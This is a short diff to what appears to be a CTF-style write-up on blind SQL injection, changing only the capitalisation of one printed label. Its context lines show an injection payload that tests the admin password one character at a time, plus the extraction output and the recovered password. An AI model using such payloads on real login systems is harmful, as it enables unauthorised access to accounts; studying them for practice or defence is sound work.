@@ -51,7 +51,7 @@ for index in range(1, password_length + 1):
       break
 
 print()
-print(f"Extracted Password: {password}")
+print(f"Extracted password: {password}")
 print(f"Final payload: ?pw={password}")
 ```
 
@@ -78,6 +78,6 @@ Character at index 7: e
 Payload: ?pw=' || id='admin' && substr(pw, 8, 1)='c' -- -
 Character at index 8: c     
 
-Extracted Password: 7b751aec
+Extracted password: 7b751aec
 Final payload: ?pw=7b751aec 
 ```
